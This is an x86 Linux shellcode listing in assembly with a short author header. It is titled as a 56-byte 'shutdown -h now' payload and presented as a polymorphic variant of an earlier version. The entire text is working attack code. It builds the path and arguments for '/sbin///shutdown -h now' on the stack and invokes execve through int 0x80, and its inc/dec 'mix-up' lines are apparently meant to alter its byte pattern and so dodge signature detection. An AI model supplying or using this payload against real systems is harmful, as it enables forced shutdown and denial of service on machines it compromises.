; Title: shutdown -h now Shellcode - 56 bytes
; Date: 2014-06-27
; Platform: linux/x86
; Author: Osanda Malith Jayathissa (@OsandaMalith)
; Polymorphic Version: Henry <nc-nlvp.party>
global _start
section .text
_start:
;xor    eax,eax
shr eax,16
cdq
;push   eax
push   word ax
push   word 0x682d;h-
;mov    edi,esp
mov    esi,esp;bug fix
;push   eax
push   word ax
push   0x6e;n
mov    word [esp+0x1],0x776f;wo
mov    edi,esp
;push   eax
push   word ax

push   0x6e776f64;nwod
inc    ax;mix-up
push   0x74756873;tuhs
dec    ax;mix-up
push   0x2f2f2f6e;///n
inc    ax;mix-up
push   0x6962732f;ibs/
dec    ax;mix-up

mov    ebx,esp
push   edx
push   esi
push   edi
push   ebx
mov    ecx,esp
mov   al,0xb
int    0x80

